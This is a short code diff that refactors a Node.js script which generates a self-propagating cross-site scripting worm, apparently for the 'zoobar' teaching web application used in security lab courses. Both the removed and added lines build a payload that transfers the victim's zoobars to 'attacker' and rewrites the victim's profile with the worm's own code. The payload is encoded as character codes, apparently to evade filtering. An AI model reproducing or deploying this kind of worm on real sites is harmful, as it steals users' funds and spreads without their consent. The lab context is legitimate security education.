@@ -4,20 +4,12 @@ fs = require('fs');
 path = require('path');
 
 function inject() {
-  var injection = "$.ajax({\
-    type: 'POST',\
-    data: {\
-      name: 'attacker',\
-      amount: '1'\
-    },\
-    url: 'http://zoobar.org:5000/transfer'\
+  var injection = "$.post('http://zoobar.org:5000/transfer', {\
+    name: 'attacker',\
+    amount: '1'\
   });\
-  $.ajax({\
-    type: 'POST',\
-    data: {\
-      profile: $('#userZoobars').next().next().html()\
-    },\
-    url: 'http://zoobar.org:5000/update'\
+  $.post('http://zoobar.org:5000/update', {\
+    profile: $('#userZoobars').next().next().html()\
   });";
   return toCharCodes(injection);
 }
